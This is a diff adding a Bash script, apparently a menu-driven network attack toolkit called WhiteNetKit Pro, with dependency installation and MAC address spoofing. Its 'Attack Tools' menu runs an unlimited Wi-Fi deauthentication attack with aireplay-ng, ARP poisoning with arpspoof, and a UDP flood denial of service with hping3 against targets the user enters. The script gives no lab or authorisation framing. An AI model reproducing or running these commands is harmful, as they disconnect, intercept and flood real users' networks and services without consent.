@@ -1,0 +1,209 @@
+#!/bin/bash
+
+# Colors
+GREEN="\e[92m"
+RED="\e[91m"
+YELLOW="\e[93m"
+BLUE="\e[94m"
+MAGENTA="\e[95m"
+CYAN="\e[96m"
+RESET="\e[0m"
+BOLD="\e[1m"
+
+# Log file
+LOG_FILE="wnt_advanced.log"
+
+# Required tools
+REQUIRED_TOOLS=("macchanger" "arp-scan" "aircrack-ng" "dsniff" "hping3" "net-tools")
+
+# Function: Display Colorful Banner
+banner() {
+    clear
+    echo -e "${MAGENTA}${BOLD}"
+    echo " e88'Y88           888                       888 888           888               "
+    echo "d888  'Y Y8b Y888P 888 88e   ,e e,  888,8,   888 888 8888 8888 888 88e           "
+    echo "C8888      Y8b Y8P  888 888b d88 88b 888 \"    8888888 8888 8888 888 888b          "
+    echo " Y888  ,d   Y8b Y   888 888P 888   , 888      888 888 Y888 888P 888 888P          "
+    echo "  \"88,d88    888    888 88\"   \"YeeP\" 888      888 888  \"88 88\"  888 88\"           "
+    echo "             888                                                              "
+    echo "             888                                                              "
+    echo "Y88b Y88           d8     88P'888'Y88                     888 888    ,e,   d8  "
+    echo " Y88b Y8  ,e e,   d88     P'  888  'Y  e88 88e   e88 88e  888 888 ee  \"   d88  "
+    echo "b Y88b Y d88 88b d88888       888     d888 888b d888 888b 888 888 P  888 d88888"
+    echo "8b Y88b  888   ,  888         888     Y888 888P Y888 888P 888 888 b  888  888  "
+    echo "88b Y88b  \"YeeP\"  888         888      \"88 88\"   \"88 88\"  888 888 8b 888  888  "
+    echo "                                                                                 "
+    echo -e "                         ${CYAN}Created by: ${BOLD}Shaid Mahamud${RESET}"
+    echo -e "${RESET}"
+}
+
+# Function: Animated Progress Bar
+progress_bar() {
+    echo -ne "${CYAN}[+] Loading:${RESET} "
+    for i in {1..50}; do
+        echo -ne "${BLUE}#${RESET}"
+        sleep 0.02
+    done
+    echo -e "\n"
+}
+
+# Function: Log messages
+log() {
+    echo -e "$(date) - $1" >> "$LOG_FILE"
+}
+
+# Function: Install Dependencies
+install_dependencies() {
+    banner
+    echo -e "${YELLOW}[+] Checking for required dependencies...${RESET}"
+    for tool in "${REQUIRED_TOOLS[@]}"; do
+        if ! command -v "$tool" &>/dev/null; then
+            echo -e "${RED}[-] $tool is not installed. Installing...${RESET}"
+            sudo apt-get install -y "$tool" &>/dev/null && \
+            echo -e "${GREEN}[+] $tool installed successfully.${RESET}" || \
+            echo -e "${RED}[-] Failed to install $tool.${RESET}"
+        else
+            echo -e "${GREEN}[+] $tool is already installed.${RESET}"
+        fi
+    done
+    echo -e "${GREEN}[+] All dependencies are installed.${RESET}"
+    sleep 2
+}
+
+# Function: MAC Address Management
+mac_tools() {
+    banner
+    echo -e "${CYAN}[MAC Address Tools]${RESET}"
+    echo -e "${BLUE}[1] Change MAC Address${RESET}"
+    echo -e "${BLUE}[2] Reset MAC Address${RESET}"
+    echo -e "${BLUE}[3] Back to Main Menu${RESET}"
+    read -p "[+] Select an option: " mac_choice
+
+    case $mac_choice in
+        1)
+            read -p "Enter interface (e.g., wlan0): " interface
+            sudo macchanger -r "$interface" && \
+            echo -e "${GREEN}[+] MAC Address changed successfully!${RESET}" || \
+            echo -e "${RED}[-] Failed to change MAC Address!${RESET}"
+            log "MAC Address changed on $interface"
+            ;;
+        2)
+            read -p "Enter interface (e.g., wlan0): " interface
+            sudo macchanger -p "$interface" && \
+            echo -e "${GREEN}[+] MAC Address reset successfully!${RESET}" || \
+            echo -e "${RED}[-] Failed to reset MAC Address!${RESET}"
+            log "MAC Address reset on $interface"
+            ;;
+        3)
+            return
+            ;;
+        *)
+            echo -e "${RED}[-] Invalid choice!${RESET}"
+            ;;
+    esac
+    sleep 2
+}
+
+# Function: Network Tools
+network_tools() {
+    banner
+    echo -e "${CYAN}[Network Tools]${RESET}"
+    echo -e "${BLUE}[1] Scan Network (ARP Scan)${RESET}"
+    echo -e "${BLUE}[2] Show Active Connections${RESET}"
+    echo -e "${BLUE}[3] Back to Main Menu${RESET}"
+    read -p "[+] Select an option: " net_choice
+
+    case $net_choice in
+        1)
+            sudo arp-scan --localnet | tee -a "$LOG_FILE"
+            log "Performed ARP scan"
+            ;;
+        2)
+            sudo netstat -tuln | tee -a "$LOG_FILE"
+            log "Displayed active connections"
+            ;;
+        3)
+            return
+            ;;
+        *)
+            echo -e "${RED}[-] Invalid choice!${RESET}"
+            ;;
+    esac
+    sleep 2
+}
+
+# Function: Attack Tools
+attack_tools() {
+    banner
+    echo -e "${CYAN}[Attack Tools]${RESET}"
+    echo -e "${BLUE}[1] Deauthentication Attack${RESET}"
+    echo -e "${BLUE}[2] ARP Poisoning Attack${RESET}"
+    echo -e "${BLUE}[3] DOS Attack (UDP Flood)${RESET}"
+    echo -e "${BLUE}[4] Back to Main Menu${RESET}"
+    read -p "[+] Select an option: " attack_choice
+
+    case $attack_choice in
+        1)
+            read -p "Enter target MAC: " target_mac
+            read -p "Enter interface (e.g., wlan0): " interface
+            sudo aireplay-ng --deauth 0 -a "$target_mac" "$interface" | tee -a "$LOG_FILE"
+            log "Deauthentication attack on $target_mac"
+            ;;
+        2)
+            read -p "Enter target IP: " target_ip
+            read -p "Enter gateway IP: " gateway_ip
+            sudo arpspoof -i wlan0 -t "$target_ip" "$gateway_ip" | tee -a "$LOG_FILE"
+            log "ARP Poisoning attack on $target_ip via $gateway_ip"
+            ;;
+        3)
+            read -p "Enter target IP: " target_ip
+            sudo hping3 --flood --udp -p 80 "$target_ip" | tee -a "$LOG_FILE"
+            log "UDP flood attack on $target_ip"
+            ;;
+        4)
+            return
+            ;;
+        *)
+            echo -e "${RED}[-] Invalid choice!${RESET}"
+            ;;
+    esac
+    sleep 2
+}
+
+# Main Menu
+main_menu() {
+    while true; do
+        banner
+        echo -e "${CYAN}[Main Menu]${RESET}"
+        echo -e "${BLUE}[1] MAC Address Management${RESET}"
+        echo -e "${BLUE}[2] Network Tools${RESET}"
+        echo -e "${BLUE}[3] Attack Tools${RESET}"
+        echo -e "${BLUE}[4] Exit${RESET}"
+        read -p "[+] Select an option: " choice
+
+        case $choice in
+            1)
+                mac_tools
+                ;;
+            2)
+                network_tools
+                ;;
+            3)
+                attack_tools
+                ;;
+            4)
+                echo -e "${GREEN}[+] Exiting WhiteNetKit Pro. Goodbye!${RESET}"
+                exit 0
+                ;;
+            *)
+                echo -e "${RED}[-] Invalid choice! Please try again.${RESET}"
+                sleep 1
+                ;;
+        esac
+    done
+}
+
+# Run the script
+install_dependencies
+progress_bar
+main_menu
